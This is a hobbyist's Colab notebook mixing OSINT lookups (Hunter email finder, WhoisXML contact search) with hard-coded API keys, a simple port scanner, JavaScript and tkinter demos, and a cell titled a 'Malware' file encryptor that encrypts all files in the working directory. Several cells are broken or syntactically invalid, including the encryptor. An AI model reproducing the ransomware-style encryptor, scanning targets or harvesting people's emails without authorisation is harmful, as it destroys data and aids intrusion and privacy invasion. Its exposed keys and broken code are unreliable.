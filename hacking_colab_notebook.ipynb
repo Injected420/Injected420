{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Injected420/Python_Projects/blob/base_branch/hacking_colab_notebook.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Hunter API\n",
        "\n",
        "* [Domain Search](https://api.hunter.io/v2/domain-search?domain=stripe.com&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839)\n",
        "\n",
        "* [Email Finder](https://api.hunter.io/v2/email-finder?domain=reddit.com&first_name=Alexis&last_name=Ohanian&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839)\n",
        "\n",
        "* [Author Finder](https://api.hunter.io/v2/author-finder?url=https://hunter.io/blog/how-to-know-if-someone-read-your-email/&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839)\n",
        "\n",
        "* [Email Verification](https://api.hunter.io/v2/email-verifier?email=patrick@stripe.com&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839)"
      ],
      "metadata": {
        "id": "flwn8b9dQeW9"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import time\n",
        "\n",
        "# Set the URL to request\n",
        "a = 0\n",
        "while a == 0:\n",
        "  u_choose = int(input(\"1. Domain Search\\r\\n2. Email Finder\\r\\n3. Author Finder\\r\\n4. Email Verifiication\\r\\n5. Quit\\r\\n[*] Choose 1-4 to search, or 5 to quit.\"))\n",
        "  if u_choose == 1:\n",
        "    # https://api.hunter.io/v2/domain-search?domain=stripe.com&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\n",
        "    domain = input(\"Please enter a domain to search: \")\n",
        "    time.sleep(1)\n",
        "    ds_link = f\"https://api.hunter.io/v2/domain-search?domain={domain}&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\"\n",
        "    ds_response = requests.get(ds_link)\n",
        "    # Check if the request was successful\n",
        "    if ds_response.status_code == 200:\n",
        "      print(ds_response.content)\n",
        "      print(ds_response.text)\n",
        "    else:\n",
        "    # Print an error message\n",
        "      print(f\"Error: {ds_response.status_code}\")\n",
        "  elif u_choose == 2:\n",
        "    # https://api.hunter.io/v2/email-finder?domain=reddit.com&first_name=Alexis&last_name=Ohanian&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\n",
        "    domain = input(\"[*] Enter the domain on which to search: \")\n",
        "    fname = input(\"[*] Enter the person's first name: \")\n",
        "    lname = input(\"[*] Enter the person's last name: \")\n",
        "    ef_url = f\"https://api.hunter.io/v2/email-finder?domain={domain}&first_name={fname}&last_name={lname}&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\"\n",
        "    ef_response = requests.get(ef_url)\n",
        "    if ef_response.status_code == 200:\n",
        "      print(ef_response.content)\n",
        "      print(ef_response.text)\n",
        "    elif ef_response.status_code != 200:\n",
        "      print(f\"Website didn't return a successful response.\\r\\n{ef_response.status_code}\")\n",
        "    continue\n",
        "  elif u_choose == 3:\n",
        "    # https://api.hunter.io/v2/author-finder?url=https://hunter.io/blog/how-to-know-if-someone-read-your-email/&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\n",
        "    continue\n",
        "  elif u_choose == 4:\n",
        "    # https://api.hunter.io/v2/email-verifier?email=patrick@stripe.com&api_key=5ee636f9ed74499c7b43e4393d6d5c8d4935e839\n",
        "    continue\n",
        "  elif u_choose == 5:\n",
        "    print(\"GOODBYE!!!\")\n",
        "    break\n",
        "\n",
        "  else:\n",
        "    print(f\"Error: {ValueError}. Please Enter only 1-5.\")\n",
        "    continue"
      ],
      "metadata": {
        "id": "s4cC45rvRE3p"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Q9zAmDNeZ0N9"
      },
      "source": [
        "#### Javascript via Python"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "PET3xMYOaR5b"
      },
      "outputs": [],
      "source": [
        "%%html\n",
        "<link rel=\"stylesheet\" href=\"/nbextensions/google.colab/tabbar.css\">\n",
        "<div class='goog-tab'>\n",
        "  Some content\n",
        "</div>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "aKo6mtPDaR5c"
      },
      "outputs": [],
      "source": [
        "import portpicker\n",
        "import threading\n",
        "import socket\n",
        "import IPython\n",
        "\n",
        "from six.moves import socketserver\n",
        "from six.moves import SimpleHTTPServer\n",
        "\n",
        "class V6Server(socketserver.TCPServer):\n",
        "  address_family = socket.AF_INET6\n",
        "\n",
        "class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n",
        "  def do_GET(self):\n",
        "    self.send_response(200)\n",
        "    # If the response should not be cached in the notebook for\n",
        "    # offline access:\n",
        "    self.send_header('x-colab-notebook-cache-control', 'no-cache')\n",
        "    self.end_headers()\n",
        "    self.wfile.write(b'''\n",
        "      document.querySelector('#output-area').appendChild(document.createTextNode('Script result!'));\n",
        "    ''')\n",
        "\n",
        "port = portpicker.pick_unused_port()\n",
        "\n",
        "def server_entry():\n",
        "    httpd = V6Server(('::', port), Handler)\n",
        "    # Handle a single request then exit the thread.\n",
        "    httpd.serve_forever()\n",
        "\n",
        "thread = threading.Thread(target=server_entry)\n",
        "thread.start()\n",
        "\n",
        "# Display some HTML referencing the resource.\n",
        "display(IPython.display.HTML('<script src=\"https://localhost:{port}/\"></script>'.format(port=port)))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "j_YR83HiaR5d"
      },
      "outputs": [],
      "source": [
        "from google.colab import output\n",
        "output.serve_kernel_port_as_iframe(port)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "GW_vgjZmaR5e"
      },
      "outputs": [],
      "source": [
        "from google.colab import output\n",
        "output.serve_kernel_port_as_window(port)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "fLp02xoGPZ6f"
      },
      "outputs": [],
      "source": [
        "import IPython\n",
        "js_code = '''\n",
        "document.querySelector('#output-area').appendChild(document.createTextNode(\"OutPut Area\"))\n",
        "'''\n",
        "code_more = '''\n",
        "\n",
        "'''\n",
        "display(IPython.display.Javascript(js_code))\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "G7X-Gc7zRyK6"
      },
      "source": [
        "\n",
        "\n",
        "```\n",
        "# This is formatted as code\n",
        "```\n",
        "\n",
        "# Server with Django\n",
        "\n",
        "python -m runserver (port)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ZCtTdmox1l8d"
      },
      "source": [
        "## Using the WhoisXML Api and its variations\n",
        "\n",
        "[All Apis Link](https://user.whoisxmlapi.com/products)\n",
        "\n",
        "* **First Cell** - Domain Contact Info"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "2j8Fh0_wPqMv"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "import xml\n",
        "\n",
        "WHOXKEY = \"at_7umGaqK8LFX1ERkDfHcwbifghnBXc\"\n",
        "def contact_info():\n",
        "  domain_name = str(input(\"Which domain do you want to search: \"))\n",
        "  hard_refresh = int(input(\"If you want a live version of the site Enter 1.\\nOtherwise Enter 0: \"))\n",
        "  out_format = str(input(\"Would you like the output in JSON or XML: \"))\n",
        "  domain_contacts = \"https://website-contacts.whoisxmlapi.com/api/v1?apiKey=\"+WHOXKEY+\"&hardRefresh=\"+str(hard_refresh)+\"&outputFormat=\"+out_format+\"&domainName=\"+domain_name\n",
        "  r = requests.get(domain_contacts).text\n",
        "  return r\n",
        "\n",
        "contact_info()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "J_gtKgck3JGn"
      },
      "outputs": [],
      "source": [
        "import datetime\n",
        "#@title Slider\n",
        "date = 11/30/2021 #@param {type: \"date\"}\n",
        "slider_value = 44 #@param {type: \"slider\", min: 0, max: 1000}\n",
        "\n",
        " "
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "SiQXNu9T5bya"
      },
      "source": [
        "##### Below is a Hidden Code Cell\n",
        "\n",
        "\n",
        "[This Notebook](https://colab.research.google.com/drive/1AWO3FJYldrvwseb-Y6_BthYnmXJIE-0b#scrollTo=SiQXNu9T5bya)\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "acdgZSLC5avr"
      },
      "outputs": [],
      "source": [
        "#@title I am a Hidden Code {display-mode: \"form\"}\n",
        "\n",
        "#This code will be hidden on notebook loads\n",
        "page = 0\n",
        "if :\n",
        "  page += 1"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "EMafLzErIF0o"
      },
      "outputs": [],
      "source": [
        "import socket\n",
        "import ipaddress\n",
        "import requests\n",
        "\n",
        "\n",
        "def check_ip(ip):\n",
        "    try:\n",
        "        ipaddress.\n",
        "        return ip\n",
        "    except ValueError:\n",
        "        return socket.gethostbyname(ip)\n",
        "\n",
        "\n",
        "# noinspection PyBroadException\n",
        "\n",
        "\n",
        "def port_scan(ipaddress, port):\n",
        "    try:\n",
        "        sock = socket.socket()\n",
        "        sock.settimeout(0.25)\n",
        "        sock.connect((ipaddress, port))\n",
        "        print('[-] Port ' + str(port) + ' is Open.')\n",
        "\n",
        "    except:\n",
        "        print('[-] Port ' + str(port) + ' is Closed')\n",
        "\n",
        "\n",
        "port = range(0, 1000)\n",
        "ipaddress = input(\"[+] Enter Target to Scan: \")\n",
        "converted_ip = check_ip(ipaddress)\n",
        "\n",
        "\n",
        "for i in port:\n",
        "    port_scan(converted_ip, port[i])\n"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Using Tkinter to create Widgets\n",
        "\n",
        "I am going to write several code cells, each will have the base tkinter widget, but they will differ in other ways."
      ],
      "metadata": {
        "id": "dTl0uUZVFZZ2"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title  Main Widget\n",
        "import tkinter as tk\n",
        "\n",
        "\"\"\"def empty_window():\n",
        "    # Create the main window\n",
        "    main_window = tk.Tk()\n",
        "\n",
        "    # Enter the tkinter main loop\n",
        "    tk.mainloop()\n",
        "\n",
        "empty_window()\"\"\"\n",
        "\n",
        "class myGUI:\n",
        "    def __init__(self):\n",
        "        # Create main window\n",
        "        self.main_window = tk.Tk()\n",
        "\n",
        "        # Enter the loop\n",
        "        tk.mainloop()\n",
        "\n",
        "# Create an instance of the class\n",
        "my_gui = myGUI()"
      ],
      "metadata": {
        "id": "O8FupR6_FG8n"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Widget with Label\n",
        "import tkinter\n",
        "class myGui:\n",
        "  def __init__(self):\n",
        "      self.main_win = tk.Tk()\n",
        "      self.label = tk.Label(self.main_win, text=\"This is the Label\")\n",
        "\n",
        "      # Call the Label Widget's pack method\n",
        "      self.label.pack()\n",
        "\n",
        "      # tk loop\n",
        "      tk.mainloop()\n",
        "\n",
        "gu = myGui()"
      ],
      "metadata": {
        "id": "i14G8xCOGQjs"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Widget with 2 Labels\n",
        "\n",
        "class twolabels:\n",
        "    def __init__(self):\n",
        "        self.window = tk.Tk()\n",
        "        self.label = tk.Label(self.window, text=\"Python Widget\")\n",
        "        self.label1 = tk.Label(self.window, text=\"Please Enter Your Name: \")\n",
        "        self.label.pack()\n",
        "        self.label1.pack()\n",
        "        tk.mainloop()\n",
        "\n",
        "# If you want to display the labels differently use pack(side='left')"
      ],
      "metadata": {
        "id": "bWtQJwoGJDva"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# 'Malware' File Encryptor\n",
        "#Find 'all' of the file\n",
        "import os\n",
        "from cryptography.fernet import Fernet\n",
        "files = []\n",
        "\n",
        "for file in os.listdir():\n",
        "    if file == \"mal.py\" or file == \"theKey.key\":\n",
        "            continue\n",
        "    if os.path.isfile(file):\n",
        "        files.append(file)\n",
        "\n",
        "key = Fernet.generate_key()\n",
        "\n",
        "with open(\"theKey.key\", \"wb\") as thekey:\n",
        "    thekey.write(key)\n",
        "\n",
        "for file in files:\n",
        "    with open(file, \"rb\") as a_file:\n",
        "        context = a_file.read()\n",
        "    context_enc = Fernet(key.encrypt(context))\n",
        "    with open(file, \"wb\") as a_file:\n",
        "      a_file.os.write(context_enc)\n",
        "\n"
      ],
      "metadata": {
        "id": "Uz9W9ETfr5to",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 373
        },
        "outputId": "d83c435b-9c67-40e4-f58c-0507e2943392"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ModuleNotFoundError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-7-63d9b1436794>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;31m#Find 'all' of the file\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mos\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mcryptography\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfernet\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mFernet\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0mfiles\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'cryptography'",
            "",
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"
          ],
          "errorDetails": {
            "actions": [
              {
                "action": "open_url",
                "actionText": "Open Examples",
                "url": "/notebooks/snippets/importing_libraries.ipynb"
              }
            ]
          }
        }
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPDpX9byh1/rorAPKMy+21W",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}